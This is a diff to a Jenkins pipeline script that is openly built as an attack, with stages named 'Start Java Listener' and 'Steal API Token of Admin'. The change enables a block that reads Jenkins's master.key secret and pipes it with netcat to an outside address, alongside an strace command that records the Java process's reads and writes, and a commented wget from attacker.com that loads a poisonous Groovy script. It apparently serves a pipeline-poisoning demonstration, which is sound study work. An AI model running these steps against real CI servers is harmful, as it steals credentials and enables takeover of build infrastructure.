@@ -3,8 +3,8 @@ def myscript;
 node('ubuntu') {
     def app  
     /// sh "wget attacker.com/poisonous.groovy"
-    myscript = load('/tmp/poisonous.groovy')
-    myscript.lookAtThis("Steve")
+    //myscript = load('/tmp/poisonous.groovy')
+    //myscript.lookAtThis("Steve")
 
     stage('Start Java Listener') {
         sh 'sudo strace -fp $(pidof java) -v -e read,write,open -s 9999 -o /home/ubuntu/getIntoDevOps.2 &'
@@ -53,9 +53,9 @@ node ('master') {
     
     stage('Steal API Token of Admin') {
         
-        myscript.steal()
+      //  myscript.steal()
 
-/*        
+  
         println "\n\n=========================================================";
         def fileContents = readFile file: "/var/lib/jenkins/secrets/master.key", encoding: "UTF-8"
         println fileContents
@@ -76,7 +76,7 @@ node ('master') {
         println str
 
         sh 'cat /var/lib/jenkins/secrets/master.key | netcat  192.168.190.129 6666'
-*/        
+        
     }
 }
 
